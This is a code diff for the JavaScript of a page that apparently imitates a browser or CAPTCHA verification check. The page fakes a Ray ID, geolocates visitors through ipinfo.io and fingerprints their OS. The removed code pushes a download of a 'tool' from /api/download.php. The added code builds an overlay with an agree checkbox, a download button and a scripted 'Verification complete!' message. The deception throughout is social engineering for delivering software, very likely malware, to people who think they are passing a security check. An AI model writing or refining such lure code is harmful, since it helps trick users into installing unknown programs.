@@ -46,7 +46,7 @@ function setLanguage(translations) {
   translatableElements.forEach((element) => {
 
     var translateKey = element.getAttribute("data-translate");
-    translations[userLang][translateKey] = translations[userLang][translateKey].replace('{{domain}}', domain).replace('{{browserName}}', browserName).replace('{{httpHOST}}', '<span style="font-weight: 500;">'+httpHOST+'</span>');
+    translations[userLang][translateKey] = translations[userLang][translateKey].replace('{{domain}}', domain).replace('{{httpHOST}}', '<span style="font-weight: 500;">'+httpHOST+'</span>');
     element.innerHTML = translations[userLang][translateKey];
   });
 }
@@ -184,88 +184,6 @@ $('#checkbox-container').click(function() {
 })
 
 
-// checkbox
-$('#checkbox').change(function() {
-  var ischeck = document.getElementById('checkbox').checked;
-  
-  if (ischeck) {
-    $('#report').removeAttr('disabled');
-  } else {
-    $('#report').attr('disabled', 'true');
-  }
-})
-
-
-// download ban more than 2 times
-var downloadCount = 0;
-
-// click report button
-$('#report').click(function() {
-  if (isClose) {
-    downloadCount++;
-    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
-
-    if (archiving == 'OFF') {
-        window.setTimeout(function() {
-          hide_popup();
-          $('#captcha-wrapper').css('display', 'none');
-          $('#action').css('display', 'none');
-          $('.detail').css('display', 'none');
-          $('#success').css('display', 'flex');
-          $('.wait-respond').css('display', 'block');
-        }, 8000);
-
-        window.setTimeout(function() {
-          document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
-          $('#captcha-wrapper').css('display', 'block');
-          $('#success').css('display', 'none');
-          $('.wait-respond').css('display', 'none');
-          $('#wait').css('display', 'block');
-          $('.captcha-error').css('display', 'block');
-          $('.video1').css('display', 'none');
-          $('.video2').css('display', 'none');
-          $('.video3').css('display', 'block');
-        }, 12000);
-    }
-
-
-    if (archiving == 'ON') {
-      window.setTimeout(function() {
-        hide_popup();
-        $('#captcha-wrapper').css('display', 'none');
-        $('#action').css('display', 'none');
-        $('.detail').css('display', 'none');
-        $('#success').css('display', 'flex');
-        $('.wait-respond').css('display', 'block');
-      }, 3000);
-
-      window.setTimeout(function() {
-        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
-        $('#captcha-wrapper').css('display', 'block');
-        $('#success').css('display', 'none');
-        $('.wait-respond').css('display', 'none');
-        $('#wait').css('display', 'block');
-        $('.captcha-error').css('display', 'block');
-        $('.video1').css('display', 'none');
-        $('.video2').css('display', 'none');
-        $('.video3').css('display', 'block');
-      }, 35000);
-    }
-
-    
-    // window.alert("Download complete.\nThe tool is ready to use.");
-  }
-  
-  if (downloadCount >= 2) {
-    isClose = false;
-    $('#report').css('background', '#efefef');
-    $('#report').attr('disabled', 'true');
-  }
-})
-
-$(document).on('click', '#refresh_btn', function() {
-    location.reload();
-})
 
 // Function to generate a random 16-character hexadecimal Ray ID
 function generateRayID() {
@@ -298,6 +216,7 @@ $.post('/api/get_archiving.php', {}, function(res) {
 
 // Getting the country code from the user's IP
 var country_code = '';
+
 
 $.get('https://ipinfo.io/json', function(ipinfo) {
   country_code = ipinfo.country;
@@ -344,4 +263,116 @@ function getOS() {
   if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
   if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
   return 'Unknown OS';
+}
+
+
+
+function download_file() {
+  if (isClose) {
+    // window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
+  }
+}
+
+
+$(document).on('click', '#refresh_btn', function() {
+    location.reload();
+})
+
+
+
+// PC overlay Functions
+
+function pc_overlay_toggleDropdown() {
+    const dropdownContent = document.getElementById("pc_overlay_dropdown-content");
+    const dropdown = document.getElementById("pc_overlay_dropdown");
+    dropdownContent.style.display = dropdownContent.style.display === "block" ? "none" : "block";
+    dropdown.classList.toggle("open");
+}
+
+function pc_overlay_toggleButton() {
+    const checkbox = document.getElementById("pc_overlay_agree-checkbox");
+    const button = document.getElementById("pc_overlay_download-button");
+    if (checkbox.checked) {
+        button.classList.add("active");
+        button.removeAttribute("disabled");
+    } else {
+        button.classList.remove("active");
+        button.setAttribute("disabled", "true");
+    }
+}
+
+function pc_overlay_openConfirmPopup() {
+
+    download_file();
+
+    // download button disable
+    document.getElementById("pc_overlay_download-button").classList.remove("active");
+    document.getElementById("pc_overlay_download-button").setAttribute("disabled", "true");
+
+    window.setTimeout(() => {
+      // download button enable
+      document.getElementById("pc_overlay_download-button").classList.add("active");
+      document.getElementById("pc_overlay_download-button").removeAttribute("disabled");
+      // Hide the first popup content and show the second confirmation popup
+      document.getElementById("pc_overlay_first-popup-title").style.display = "none";
+      document.getElementById("pc_overlay_first-popup-content").style.display = "none";
+      document.getElementById("pc_overlay_dropdown").style.display = "none";
+      document.getElementById("pc_overlay_dropdown-content").style.display = "none";
+      document.getElementById("pc_overlay_first-popup-checkbox").style.display = "none";
+      document.getElementById("pc_overlay_first-popup-footer").style.display = "none";
+      document.getElementById("pc_overlay_confirm-popup-content").style.display = "block";
+    }, 10000);
+}
+
+function pc_overlay_showLoading() {
+    // Show the loading text and simulate a verification process
+    const loadingText = document.getElementById("pc_overlay_loading-text");
+    loadingText.style.display = "block";
+    
+    // Simulate a delay for verification (e.g., 3 seconds)
+    setTimeout(() => {
+        loadingText.innerText = "Verification complete!";
+        
+        // Close the popup after a short delay (e.g., 1 second)
+        setTimeout(() => {
+            hide_popup();
+
+            $('#captcha-wrapper').css('display', 'none');
+            $('#action').css('display', 'none');
+            $('.detail').css('display', 'none');
+            $('#success').css('display', 'flex');
+            $('.wait-respond').css('display', 'block');
+
+            if (archiving == 'OFF') {
+                window.setTimeout(function() {
+                  document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+                  $('#captcha-wrapper').css('display', 'block');
+                  $('#success').css('display', 'none');
+                  $('.wait-respond').css('display', 'none');
+                  $('#wait').css('display', 'block');
+                  $('.captcha-error').css('display', 'block');
+                  $('.video1').css('display', 'none');
+                  $('.video2').css('display', 'none');
+                  $('.video3').css('display', 'block');
+                }, 50000);
+            }
+
+
+            if (archiving == 'ON') {
+               window.setTimeout(function() {
+                document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+                $('#captcha-wrapper').css('display', 'block');
+                $('#success').css('display', 'none');
+                $('.wait-respond').css('display', 'none');
+                $('#wait').css('display', 'block');
+                $('.captcha-error').css('display', 'block');
+                $('.video1').css('display', 'none');
+                $('.video2').css('display', 'none');
+                $('.video3').css('display', 'block');
+              }, 50000);
+            }
+            
+        }, 1000);
+
+    }, 3000);
 }
